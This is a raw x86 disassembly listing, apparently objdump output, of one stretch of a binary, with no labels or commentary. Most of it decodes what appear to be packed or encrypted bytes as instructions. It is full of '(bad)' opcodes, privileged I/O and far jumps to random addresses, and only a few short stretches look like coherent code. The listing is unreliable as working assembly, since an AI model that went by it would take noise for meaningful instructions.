  41c455:	add    BYTE PTR [eax],al
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c474
  41c464:	aas    
  41c465:	or     ch,BYTE PTR [eax+0x787fec68]
  41c46b:	adc    BYTE PTR [esi+0x78],bh
  41c46e:	js     0x41c44d
  41c470:	mov    dl,0x9a
  41c472:	mov    ah,0x17
  41c474:	pusha  
  41c475:	mov    eax,0x1ba40a73
  41c47a:	ja     0x41c4b3
  41c47c:	mov    al,0x76
  41c47e:	sub    edx,edx
  41c480:	pop    ecx
  41c481:	jae    0x41c46d
  41c483:	sbb    al,0x31
  41c485:	sti    
  41c486:	xor    esi,eax
  41c488:	mov    bl,0x8f
  41c48a:	mov    ecx,DWORD PTR ds:0xaba9b460
  41c490:	sbb    ebp,DWORD PTR [edx]
  41c492:	fbstp  TBYTE PTR [ebp-0x26085caa]
  41c498:	push   0x46a5f002
  41c49d:	mov    edi,0x5f1d240d
  41c4a2:	add    bl,dh
  41c4a4:	push   ecx
  41c4a5:	push   ebp
  41c4a6:	into   
  41c4a7:	cld    
  41c4a8:	mov    esp,0xac292fa6
  41c4ad:	outs   dx,BYTE PTR ds:[esi]
  41c4ae:	shl    BYTE PTR ds:0xfa96c3c4,1
  41c4b4:	xchg   edi,eax
  41c4b5:	push   0xffffff8b
  41c4b7:	mov    edi,DWORD PTR [esi]
  41c4b9:	inc    ebp
  41c4ba:	mov    dl,0x5
  41c4bc:	lds    esp,FWORD PTR [ebp-0x12]
  41c4bf:	xchg   edi,eax
  41c4c0:	aas    
  41c4c1:	call   0x2bc0:0xa1388a6c
  41c4c8:	repz sti 
  41c4ca:	js     0x41c4af
  41c4cc:	sub    esp,DWORD PTR ds:0x228563cd
  41c4d2:	out    dx,al
  41c4d3:	jp     0x41c4d3
  41c4d5:	xchg   edx,eax
  41c4d6:	ror    BYTE PTR [eax],1
  41c4d8:	mov    esp,0x8e7ea75f
  41c4dd:	scas   eax,DWORD PTR es:[edi]
  41c4de:	jge    0x41c54d
  41c4e0:	outs   dx,BYTE PTR ds:[esi]
  41c4e1:	iret   
  41c4e2:	jb     0x41c4be
  41c4e4:	sbb    ah,ah
  41c4e6:	(bad)  
  41c4e7:	clc    
  41c4e8:	push   ebx
  41c4e9:	nop
  41c4ea:	cmp    esp,0x58f9d247
  41c4f0:	add    ebx,eax
  41c4f2:	frstor [ebx]
  41c4f4:	mov    al,ds:0x8c438bcf
  41c4f9:	adc    cl,al
  41c4fb:	shl    dl,cl
  41c4fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4fe:	loopne 0x41c519
  41c500:	push   edx
  41c501:	or     edx,edx
  41c503:	push   esi
  41c504:	dec    ebp
  41c505:	aad    0xe2
  41c507:	enter  0x5bb2,0x10
  41c50b:	fs cwde 
  41c50d:	add    ebx,DWORD PTR [ecx]
  41c50f:	jg     0x41c517
  41c511:	xchg   BYTE PTR [esi],cl
  41c513:	ret    0xe46b
  41c516:	add    DWORD PTR [ebx],edi
  41c518:	clc    
  41c519:	inc    ebx
  41c51a:	mov    cs,ecx
  41c51c:	daa    
  41c51d:	inc    ebp
  41c51e:	nop
  41c51f:	leave  
  41c520:	add    DWORD PTR [edx-0x55cf2744],ecx
  41c526:	sbb    edi,esp
  41c528:	jb     0x41c4b9
  41c52a:	(bad)  
  41c52b:	rcl    ecx,cl
  41c52d:	mov    bh,BYTE PTR [edx-0x6d]
  41c530:	sbb    BYTE PTR [ebx-0x39],dh
  41c533:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c534:	scas   al,BYTE PTR es:[edi]
  41c535:	int3   
  41c536:	mov    ecx,DWORD PTR [ebp+0x2b]
  41c539:	push   ecx
  41c53a:	pop    ds
  41c53b:	jbe    0x41c584
  41c53d:	enter  0x1061,0xa7
  41c541:	aam    0x28
  41c543:	fs test ebp,0x1d8054e9
  41c54a:	sti    
  41c54b:	xchg   ebx,eax
  41c54c:	xor    DWORD PTR [ebp+0x2f],ebx
  41c54f:	cmp    bl,0x23
  41c552:	add    eax,DWORD PTR [edx-0x2d]
  41c555:	jg     0x41c556
  41c557:	stos   BYTE PTR es:[edi],al
  41c558:	jmp    0x41c59d
  41c55a:	cwde   
  41c55b:	out    dx,al
  41c55c:	(bad)  
  41c55d:	repnz loop 0x41c5ba
  41c560:	sar    edi,1
  41c562:	jae    0x41c573
  41c564:	rcr    DWORD PTR [edi+0x2d7d6e77],1
  41c56a:	mov    esp,0xea0a01fc
  41c56f:	sbb    dl,BYTE PTR [esi+esi*2]
  41c572:	cld    
  41c573:	add    eax,0x3bb5fbd0
  41c578:	mov    gs,WORD PTR [edx-0x69]
  41c57b:	out    dx,al
  41c57c:	xor    esi,esp
  41c57e:	clc    
  41c57f:	cmp    BYTE PTR [esi+0x4c3352a0],0xe6
  41c586:	jp     0x41c57f
  41c588:	cld    
  41c589:	sbb    DWORD PTR [ebx],esi
  41c58b:	enter  0x56eb,0xe4
  41c58f:	add    bh,0xbf
  41c592:	mov    al,ds:0x890f2c15
  41c597:	mov    cl,0xcb
  41c599:	xor    dh,al
  41c59b:	dec    esp
  41c59c:	jbe    0x41c526
  41c59e:	sbb    al,0x99
  41c5a0:	mov    ah,0x21
  41c5a2:	push   ss
  41c5a3:	popf   
  41c5a4:	jl     0x41c595
  41c5a6:	pop    ds
  41c5a7:	inc    ecx
  41c5a8:	push   es
  41c5a9:	in     eax,0xed
  41c5ab:	xor    bh,BYTE PTR [eax]
  41c5ad:	lahf   
  41c5ae:	in     al,dx
  41c5af:	std    
  41c5b0:	hlt    
  41c5b1:	cld    
  41c5b2:	data16 and BYTE PTR [ecx-0x331c2271],dl
  41c5b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5ba:	dec    edi
  41c5bc:	xchg   esp,eax
  41c5bd:	pop    edi
  41c5be:	inc    edi
  41c5bf:	xchg   ebp,edi
  41c5c1:	cmp    ebp,esp
  41c5c3:	cmp    ah,bh
  41c5c5:	shl    DWORD PTR [ebx+0x44],0x6f
  41c5c9:	repz retf 
  41c5cb:	or     al,0x21
  41c5cd:	and    ebx,eax
  41c5cf:	and    esi,DWORD PTR [esi-0x61]
  41c5d2:	jb     0x41c641
  41c5d4:	aam    0x40
  41c5d6:	sahf   
  41c5d7:	mov    DWORD PTR [edx+0xc],edi
  41c5da:	and    eax,0x31a74b8b
  41c5df:	(bad)  
  41c5e0:	aas    
  41c5e1:	cdq    
  41c5e2:	jns    0x41c59f
  41c5e4:	sbb    al,0x36
  41c5e6:	out    0x26,al
  41c5e8:	out    dx,eax
  41c5e9:	xchg   DWORD PTR [bx],ecx
  41c5ec:	xchg   ebp,ecx
  41c5ee:	push   0x1e5fc27f
  41c5f3:	cwde   
  41c5f4:	in     al,dx
  41c5f5:	ret    0x5f63
  41c5f8:	inc    edi
  41c5f9:	pop    esi
  41c5fa:	sbb    eax,0xae2d4de6
  41c5ff:	test   esp,esp
  41c601:	mov    al,0x90
  41c603:	sbb    eax,0x66c4976b
  41c608:	dec    ebp
  41c609:	sbb    ecx,DWORD PTR [ecx+0x55]
  41c60c:	nop
  41c60d:	mov    bh,0xd4
  41c60f:	add    ebx,DWORD PTR fs:[edi]
  41c612:	pusha  
  41c613:	pop    esi
  41c614:	leave  
  41c615:	clc    
  41c616:	sahf   
  41c617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c618:	nop
  41c619:	in     al,dx
  41c61a:	push   cs
  41c61b:	les    eax,FWORD PTR [eax+ebp*8]
  41c61e:	inc    ebx
  41c61f:	mov    cl,BYTE PTR [ecx-0x49]
  41c622:	test   al,0xc4
  41c624:	or     BYTE PTR [ebx+0x65],0x7b
  41c628:	jle    0x41c656
  41c62a:	mov    ds:0x7bdcb8d7,eax
  41c62f:	add    DWORD PTR [ecx+0x75795c67],esp
  41c635:	loopne 0x41c629
  41c637:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c638:	mov    ebx,0x56538ee8
  41c63d:	fsub   DWORD PTR [ebp+0x53488ab9]
  41c643:	das    
  41c644:	mov    cl,0xb9
  41c646:	imul   esi,ecx,0xffffff90
  41c649:	test   BYTE PTR [edx],0x73
  41c64c:	test   DWORD PTR [esp+ebp*1],edi
  41c64f:	mov    bl,ch
  41c651:	xor    al,ah
  41c653:	mov    edx,0xab81fa15
  41c658:	call   0x9923:0xc789f642
  41c65f:	jp     0x41c6b2
  41c661:	lahf   
  41c662:	mov    dh,0x8
  41c664:	inc    edx
  41c665:	or     eax,0x2bd868bb
  41c66a:	pop    ebp
  41c66b:	xchg   edx,eax
  41c66c:	inc    ecx
  41c66d:	sti    
  41c66e:	push   esi
  41c66f:	add    eax,0xa3b89748
  41c674:	(bad)  
  41c675:	dec    eax
  41c676:	add    eax,DWORD PTR [ebp+0x417aa5ed]
  41c67c:	jmp    0xdb82f46f
  41c681:	repnz ds dec esp
  41c684:	(bad)  [ebp-0x7224ccf7]
  41c68a:	inc    ebp
  41c68b:	lock add ebx,DWORD PTR [eax]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x7b10773e,eax
  41c6cc:	adc    DWORD PTR [eax+eax*1],eax
  41c6cf:	icebp  
  41c6d0:	jg     0x41c74a
  41c6d2:	adc    BYTE PTR [esi+0x78],bh
  41c6d5:	js     0x41c6c7
  41c6d7:	xor    ch,BYTE PTR [ebx+0x53]
  41c6da:	test   al,cl
  41c6dc:	(bad)  
  41c6dd:	cmp    al,0x5f
  41c6df:	push   eax
  41c6e0:	push   ecx
  41c6e1:	fisttp QWORD PTR [edx-0x4f50b623]
  41c6e7:	adc    BYTE PTR [edx-0x28ad2dba],ah
  41c6ed:	jl     0x41c768
  41c6ef:	xchg   BYTE PTR [eax-0x61],cl
  41c6f2:	pop    ebp
  41c6f3:	and    eax,0xc7abf6bc
  41c6f8:	ret    
  41c6f9:	adc    BYTE PTR [edx],ch
  41c6fb:	mov    al,dh
  41c6fd:	xor    al,0xd4
  41c6ff:	sub    eax,0x5a7dfae1
  41c704:	lahf   
  41c705:	call   ebp
  41c707:	dec    esp
  41c708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c709:	loope  0x41c6e1
  41c70b:	mov    BYTE PTR [edi-0x70],ch
  41c70e:	pand   mm3,QWORD PTR [eax+0x10097a81]
  41c715:	jns    0x41c728
  41c717:	inc    eax
  41c718:	mov    ebx,0xeebe60d9
  41c71d:	jo     0x41c794
  41c71f:	ret    
  41c720:	mov    eax,ds:0xea094e77
  41c725:	call   0x537497b1
  41c72a:	xlat   BYTE PTR ds:[ebx]
  41c72b:	test   BYTE PTR [eax-0x2163216],bh
  41c731:	jle    0x41c6df
  41c733:	dec    esi
  41c734:	(bad)  
  41c735:	fmul   st(1),st
  41c737:	push   ecx
  41c738:	mov    ds:0xc89f909f,al
  41c73d:	push   edx
  41c73e:	in     eax,dx
  41c73f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c740:	lods   al,BYTE PTR ds:[esi]
  41c741:	sbb    al,0x8a
  41c743:	cli    
  41c744:	sbb    DWORD PTR [eax],ebx
  41c746:	fisubr DWORD PTR [edi+0x42]
  41c749:	mov    eax,ds:0x2979e7ec
  41c74e:	int3   
  41c74f:	dec    eax
  41c750:	stos   BYTE PTR es:[edi],al
  41c751:	add    bl,ah
  41c753:	loope  0x41c6eb
  41c755:	in     al,dx
  41c756:	push   cs
  41c757:	scas   eax,DWORD PTR es:[edi]
  41c758:	(bad)  
  41c75a:	xchg   ebx,eax
  41c75b:	popa   
  41c75c:	mov    edx,ss
  41c75e:	adc    BYTE PTR [bp-0x172f],ah
  41c763:	push   0x1423c843
  41c768:	adc    BYTE PTR [ebx],ch
  41c76a:	iret   
  41c76b:	cmp    BYTE PTR [eax+ecx*1],0x5c
  41c76f:	jle    0x41c7dc
  41c771:	cmp    ecx,DWORD PTR [esi+esi*4+0x75a7ecac]
  41c778:	pop    edx
  41c779:	stc    
  41c77a:	mov    bl,BYTE PTR [edi-0x59b3d013]
  41c780:	add    BYTE PTR [esi+0x2170f0ae],al
  41c786:	in     al,0x6f
  41c788:	rol    bh,cl
  41c78a:	dec    ebx
  41c78b:	test   BYTE PTR [ebp+0x6b],al
  41c78e:	sbb    al,0x2e
  41c790:	sbb    esi,DWORD PTR [eax]
  41c792:	clc    
  41c793:	mov    dh,0x61
  41c795:	jg     0x41c7f9
  41c797:	cmc    
  41c798:	sahf   
  41c799:	push   ebp
  41c79a:	jnp    0x41c7c9
  41c79c:	xor    al,0x86
  41c79e:	pandn  mm4,QWORD PTR [esi-0x78]
  41c7a2:	lds    eax,FWORD PTR [ebx]
  41c7a4:	inc    ecx
  41c7a5:	dec    ecx
  41c7a6:	jle    0x41c7a9
  41c7a8:	loop   0x41c72a
  41c7aa:	shr    DWORD PTR [ebx+0x20],0xe6
  41c7ae:	mov    dh,0x79
  41c7b0:	mov    ds:0xa4f01a2a,al
  41c7b5:	mov    esp,DWORD PTR [ecx-0x26]
  41c7b8:	push   edx
  41c7b9:	xchg   ebx,eax
  41c7ba:	push   edx
  41c7bb:	sub    edi,DWORD PTR [eax]
  41c7bd:	arpl   WORD PTR [ecx+ecx*8-0x3b],sp
  41c7c1:	jge    0x41c813
  41c7c3:	shr    BYTE PTR [ecx],1
  41c7c5:	push   edi
  41c7c6:	mov    fs,WORD PTR [eax]
  41c7c8:	xchg   ebp,ecx
  41c7ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7cb:	sbb    BYTE PTR [edi+0x5cb3b240],dl
  41c7d1:	mov    BYTE PTR [ebx+0x17],al
  41c7d4:	mov    ss,ebp
  41c7d6:	pop    ecx
  41c7d7:	sub    bh,bh
  41c7d9:	inc    esi
  41c7da:	loop   0x41c78e
  41c7dc:	gs cmp dh,cl
  41c7df:	jg     0x41c7e9
  41c7e1:	xchg   ecx,eax
  41c7e2:	icebp  
  41c7e3:	or     edi,DWORD PTR [edi+0x7]
  41c7e6:	adc    bl,BYTE PTR [edi]
  41c7e8:	test   dl,ah
  41c7ea:	mov    cl,0x57
  41c7ec:	or     BYTE PTR [ecx],ah
  41c7ee:	(bad)  
  41c7ef:	and    eax,0x9d1035cb
  41c7f4:	and    DWORD PTR [eax],0x127b22a6
  41c7fa:	adc    DWORD PTR [eax+0x16b10fe3],0x4a
  41c801:	adc    eax,0xa6939737
  41c806:	shr    BYTE PTR [ebp+eax*2-0x12],0xaf
  41c80b:	sbb    esp,DWORD PTR cs:[edx+eiz*1]
  41c80f:	pop    esi
  41c810:	mov    dh,0x6d
  41c812:	xchg   esi,eax
  41c813:	lahf   
  41c814:	(bad)  
  41c815:	jmp    0x8d2a:0x7ee54583
  41c81c:	cmp    al,bl
  41c81e:	cmp    BYTE PTR [ecx-0x238e9593],0x4a
  41c825:	push   esi
  41c826:	repz mov al,0x2a
  41c829:	sbb    ecx,esi
  41c82b:	mov    bh,0xef
  41c82d:	inc    eax
  41c82e:	or     al,0x70
  41c830:	in     eax,0x7a
  41c832:	test   eax,0x6c58dad0
  41c837:	push   ss
  41c838:	fsub   st(4),st
  41c83a:	(bad)  
  41c83b:	das    
  41c83c:	xchg   ecx,eax
  41c83d:	xchg   esp,eax
  41c83e:	(bad)  [edx+ebp*8+0x9]
  41c842:	sub    ebp,DWORD PTR [edi]
  41c844:	jns    0x41c861
  41c846:	call   0x3b35:0xb548a975
  41c84d:	out    dx,al
  41c84e:	inc    edx
  41c84f:	jb     0x41c875
  41c851:	jmp    0xb71fb13a
  41c856:	pop    DWORD PTR [ebp-0x20]
  41c859:	pop    ecx
  41c85a:	call   FWORD PTR [ebp+0x655fd459]
  41c860:	(bad)  
  41c861:	jge    0x41c863
  41c863:	in     eax,0x57
  41c865:	xchg   esp,eax
  41c866:	adc    DWORD PTR [edx],edx
  41c868:	xchg   ebx,eax
  41c869:	fpatan 
  41c86b:	inc    ebx
  41c86c:	pop    eax
  41c86d:	inc    eax
  41c86e:	inc    ecx
  41c86f:	xchg   ebp,eax
  41c870:	les    ebx,FWORD PTR [esi-0x43584786]
  41c876:	pop    eax
  41c877:	jp     0x41c85a
  41c879:	ja     0x41c863
  41c87b:	jne    0x41c856
  41c87d:	adc    BYTE PTR [ecx+esi*8+0x4702a9d1],bh
  41c884:	out    dx,eax
  41c885:	xor    eax,0x2036c90f
  41c88a:	call   0x90bf0a46
  41c88f:	gs dec esi
  41c891:	xor    ecx,DWORD PTR [eax+0x17]
  41c894:	loopne 0x41c867
  41c896:	pop    edx
  41c897:	inc    edi
  41c898:	sahf   
  41c899:	aaa    
  41c89a:	and    dh,cl
  41c89c:	mov    al,ds:0x9c846466
  41c8a1:	stc    
  41c8a2:	imul   BYTE PTR ds:0x49bb126e
  41c8a8:	sub    cl,0x7c
  41c8ab:	add    DWORD PTR [ecx+0x6c816181],ebx
  41c8b1:	xor    ebp,0xffffffb0
  41c8b4:	push   0xffffffe4
  41c8b6:	mov    eax,0x73479c00
  41c8bb:	push   ecx
  41c8bc:	nop
  41c8bd:	and    ah,cl
  41c8bf:	mov    ebp,0xe36f29f3
  41c8c4:	sbb    edx,DWORD PTR [eax]
  41c8c6:	(bad)  
  41c8c8:	xor    eax,DWORD PTR [esi+0x62e0f1a1]
  41c8ce:	fucom  st(5)
  41c8d0:	mov    ebp,DWORD PTR [ecx+0x4c2694e]
  41c8d6:	mov    esp,0xe268b245
  41c8db:	or     DWORD PTR [eax],ecx
  41c8dd:	dec    esp
  41c8de:	test   DWORD PTR [ebp+eax*4-0x76],esp
  41c8e2:	call   0x309d11c4
  41c8e7:	add    al,0x78
  41c8e9:	xor    dl,BYTE PTR [ecx+0x5a]
  41c8ec:	sbb    ah,bl
  41c8ee:	dec    edx
  41c8ef:	inc    ebx
  41c8f0:	add    ebx,DWORD PTR [edx+ebx*1]
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	jle    0x41c8fd
  41c911:	in     eax,0x8e
  41c913:	sbb    bh,dh
  41c915:	jg     0x41c98f
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c969
  41c91c:	jne    0x41c8c2
  41c91e:	xchg   edi,eax
  41c91f:	inc    ebp
  41c920:	dec    esp
  41c921:	mov    ds:0xcd430593,eax
  41c926:	push   ds
  41c927:	dec    edx
  41c928:	cwde   
  41c929:	cmovbe ebx,DWORD PTR [ebx-0x37]
  41c92d:	push   edx
  41c92e:	ret    
  41c92f:	nop
  41c930:	add    edx,ecx
  41c932:	xor    eax,0x968f7cd6
  41c937:	adc    al,0x93
  41c939:	xchg   bh,bh
  41c93b:	(bad)  
  41c93c:	mov    bh,0xee
  41c93e:	jmp    0x999444a7
  41c943:	xchg   BYTE PTR [ebx],bl
  41c945:	rcl    esi,0x19
  41c948:	dec    ebp
  41c949:	data16 fsub QWORD PTR [edi-0xbb05d24]
  41c950:	stc    
  41c951:	mov    WORD PTR [edi],?
  41c953:	rol    BYTE PTR [edi+0x2de2d116],cl
  41c959:	enter  0x57b2,0x25
  41c95d:	lock xchg esi,eax
  41c95f:	pop    ds
  41c960:	and    esi,DWORD PTR [edx-0x3df47934]
  41c966:	int3   
  41c967:	jo     0x41c99c
  41c969:	dec    edi
  41c96a:	sahf   
  41c96b:	and    ah,BYTE PTR [eax-0x28b97536]
  41c971:	push   ss
  41c972:	add    al,0xf3
  41c974:	test   eax,0x3ab14842
  41c979:	(bad)  [edx]
  41c97b:	push   edx
  41c97c:	ins    BYTE PTR es:[edi],dx
  41c97d:	mov    cl,0x4d
  41c97f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c980:	shr    DWORD PTR [ecx-0x3a21a958],1
  41c986:	fiadd  WORD PTR ds:0xc51220b1
  41c98c:	loop   0x41ca00
  41c98e:	push   ds
  41c98f:	fld    TBYTE PTR [ebx-0x58]
  41c992:	push   ecx
  41c993:	jmp    0x28ce:0x3c976b86
  41c99a:	mov    dh,0x69
  41c99c:	sti    
  41c99d:	jnp    0x41c9ad
  41c99f:	cmp    al,0xb2
  41c9a1:	or     BYTE PTR [edx],0x40
  41c9a4:	xsha256 (bad)
  41c9a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9a6:	push   ebp
  41c9a7:	inc    edx
  41c9a8:	jge    0x41c9bd
  41c9aa:	sahf   
  41c9ab:	jb     0x41c954
  41c9ad:	and    DWORD PTR [edx-0x46],esi
  41c9b0:	jns    0x41ca15
  41c9b2:	jg     0x41c9bd
  41c9b4:	mov    esp,0x7392f66
  41c9b9:	jmp    0xd0af280b
  41c9be:	or     BYTE PTR [ecx+eiz*2+0x11af57f2],ah
  41c9c5:	popa   
  41c9c6:	pop    ebp
  41c9c7:	xlat   BYTE PTR ds:[ebx]
  41c9c8:	cmp    bl,BYTE PTR [esi+ecx*8+0x6b93ae69]
  41c9cf:	sbb    edi,DWORD PTR [edi+eiz*1+0x6e]
  41c9d3:	ins    BYTE PTR es:[edi],dx
  41c9d4:	xor    BYTE PTR [esi+0x6b60e9da],0x16
  41c9db:	shl    DWORD PTR [ecx+eiz*2-0x42],1
  41c9df:	inc    ecx
  41c9e0:	lock sahf 
  41c9e2:	in     eax,dx
  41c9e3:	je     0x41c9b3
  41c9e5:	mov    eax,ds:0xd51ffccd
  41c9ea:	out    dx,eax
  41c9eb:	test   al,0xc8
  41c9ed:	add    al,0x35
  41c9ef:	test   al,0xd
  41c9f1:	or     BYTE PTR [edx],ah
  41c9f3:	cmp    dh,BYTE PTR [ebx-0x4531518c]
  41c9f9:	mov    edx,0xc9d385ab
  41c9fe:	push   edi
  41c9ff:	dec    edi
  41ca00:	push   ecx
  41ca01:	popa   
  41ca02:	push   0x35
  41ca04:	sub    eax,0x1aea5cf5
  41ca09:	jg     0xfeff9c42
  41ca0f:	inc    esi
  41ca10:	mov    cl,BYTE PTR [esi+edx*2+0x65f2081a]
  41ca17:	add    ecx,DWORD PTR [esi+0x24]
  41ca1a:	fs (bad) 
  41ca1c:	call   0xec42:0x15cc492f
  41ca23:	(bad)  
  41ca24:	inc    ebp
  41ca25:	dec    esp
  41ca26:	(bad)  
  41ca28:	int3   
  41ca29:	jb     0x41ca3e
  41ca2b:	inc    ecx
  41ca2c:	je     0x41c9ee
  41ca2e:	stos   DWORD PTR es:[edi],eax
  41ca2f:	cmp    DWORD PTR [ecx],ecx
  41ca31:	xor    bl,ah
  41ca33:	xchg   esp,eax
  41ca34:	cmp    esi,DWORD PTR [ebx]
  41ca36:	mov    esi,ds
  41ca38:	dec    esi
  41ca39:	fwait
  41ca3a:	pop    esp
  41ca3b:	aaa    
  41ca3c:	jo     0x41ca58
  41ca3e:	jbe    0x41ca81
  41ca40:	push   es
  41ca41:	int    0x3f
  41ca43:	jae    0x41c9cd
  41ca45:	test   BYTE PTR [ebx+0x16eda240],dl
  41ca4b:	inc    edi
  41ca4c:	fcmovnu st,st(5)
  41ca4e:	xor    edi,edx
  41ca50:	(bad)  
  41ca51:	mov    edx,0xaabd7384
  41ca56:	mov    DWORD PTR [ebx+0x6fdf342b],ebp
  41ca5c:	pop    ebp
  41ca5d:	arpl   bp,ax
  41ca5f:	imul   DWORD PTR [edi+0x77431788]
  41ca65:	pop    ss
  41ca66:	adc    ebx,DWORD PTR [ebp+0x40d20720]
  41ca6c:	adc    eax,0x8a554326
  41ca71:	push   edx
  41ca72:	inc    esp
  41ca73:	push   cs
  41ca74:	aam    0xea
  41ca76:	mov    WORD PTR [edi+0x114a90ed],cs
  41ca7c:	jmp    0x5b66:0xec12d9d8
  41ca83:	retf   0x8d42
  41ca86:	aad    0xbc
  41ca88:	sub    dh,cl
  41ca8a:	push   0x1a
  41ca8c:	jg     0x41ca88
  41ca8e:	lahf   
  41ca8f:	dec    edx
  41ca90:	inc    edi
  41ca91:	mov    bl,0xa4
  41ca93:	addr16 xchg edx,eax
  41ca95:	sbb    eax,0x1733a809
  41ca9a:	ins    BYTE PTR es:[edi],dx
  41ca9b:	push   cs
  41ca9c:	jne    0x41ca64
  41ca9e:	push   ebp
  41ca9f:	daa    
  41caa0:	retf   0xa783
  41caa3:	sub    bl,bh
  41caa5:	(bad)  
  41caa6:	pinsrw mm1,WORD PTR [ebx],0x3f
  41caaa:	lds    ebx,FWORD PTR [eax]
  41caac:	daa    
  41caad:	mov    esp,edx
  41caaf:	lock pop ss
  41cab1:	jecxz  0x41ca3c
  41cab3:	mov    eax,ds:0x1c6785a9
  41cab8:	inc    ecx
  41cab9:	ror    dh,cl
  41cabb:	fisttp WORD PTR [ecx+0x42c0b98a]
  41cac1:	inc    eax
  41cac2:	dec    ecx
  41cac3:	icebp  
  41cac4:	ficomp DWORD PTR [eax+eax*8+0xe86a743]
  41cacb:	les    esi,FWORD PTR [ebp+eax*2+0x4718f7e3]
  41cad2:	xor    al,BYTE PTR [edi+0x4d3a8975]
  41cad8:	(bad)  [ecx-0x7694b8f9]
  41cade:	rcl    al,cl
  41cae0:	retf   
  41cae1:	sub    eax,0xcdf7ed1f
  41cae6:	or     eax,0xea9d127a
  41caeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caec:	scas   al,BYTE PTR es:[edi]
  41caed:	cld    
  41caee:	inc    ebx
  41caef:	sbb    bh,BYTE PTR [eax+ecx*2-0x8]
  41caf3:	push   ss
  41caf4:	pushf  
  41caf5:	or     eax,0xc14abbf2
  41cafa:	les    edi,FWORD PTR [ebx]
  41cafc:	popa   
  41cafd:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41caff:	aam    0x6e
  41cb01:	iret   
  41cb02:	std    
  41cb03:	loope  0x41cb01
  41cb05:	scas   al,BYTE PTR es:[edi]
  41cb06:	lea    esi,[edx+0x21]
  41cb09:	sub    eax,DWORD PTR cs:0x4457af3d
  41cb10:	cli    
  41cb11:	adc    bh,BYTE PTR [ebx]
  41cb13:	and    al,0xa3
  41cb15:	cdq    
  41cb16:	and    edx,DWORD PTR [ecx]
  41cb18:	mov    al,ds:0x6baae0d5
  41cb1d:	jg     0x41cb90
  41cb1f:	push   ss
  41cb20:	mov    ecx,0xf1a23139
  41cb25:	and    edi,DWORD PTR [esi+0x72465a57]
  41cb2b:	xchg   ebp,eax
  41cb2c:	aam    0x1f
  41cb2e:	jle    0x41caf3
  41cb30:	mov    eax,ds:0xe95ec497
  41cb35:	xor    BYTE PTR [edx],al
  41cb37:	add    BYTE PTR [eax],al
  41cb39:	into   
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0x5b006037
  41cb47:	int3   
  41cb48:	wrmsr  
  41cb4a:	cmc    
  41cb4b:	jg     0x41cbc5
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41cbc6
  41cb52:	std    
  41cb53:	retf   
  41cb54:	jns    0x41cb67
  41cb56:	or     al,0xde
  41cb58:	div    BYTE PTR [esi-0x1a]
  41cb5b:	mov    ds:0x777f17bd,al
  41cb60:	ss push es
  41cb62:	test   al,0x6e
  41cb64:	push   esp
  41cb65:	pop    es
  41cb66:	sub    DWORD PTR [edi],0x13e4d3c
  41cb6c:	and    BYTE PTR [ebp-0x2da462ef],bh
  41cb72:	leave  
  41cb73:	or     eax,0x9e6bf16c
  41cb78:	rcl    BYTE PTR [ecx+0x7f],1
  41cb7b:	rcr    esi,0x46
  41cb7e:	arpl   WORD PTR [ebx],cx
  41cb80:	and    edx,0x469e53aa
  41cb86:	sahf   
  41cb87:	mov    ch,0x8c
  41cb89:	aas    
  41cb8a:	and    esp,DWORD PTR [ebx-0x46d181b2]
  41cb90:	ja     0x41cbaa
  41cb92:	lock aam 0x90
  41cb95:	and    DWORD PTR [edx+0x6800750e],0x24
  41cb9c:	adc    eax,0xbab6bbf7
  41cba1:	mov    bh,0xc7
  41cba3:	pop    ds
  41cba4:	in     al,dx
  41cba5:	adc    eax,0x207c1048
  41cbaa:	cld    
  41cbab:	xor    esi,eax
  41cbad:	sbb    eax,0x49d99efe
  41cbb2:	mov    ch,0xfd
  41cbb4:	sub    edx,eax
  41cbb6:	adc    ebp,ebp
  41cbb8:	leave  
  41cbb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbba:	dec    ecx
  41cbbb:	add    dl,ah
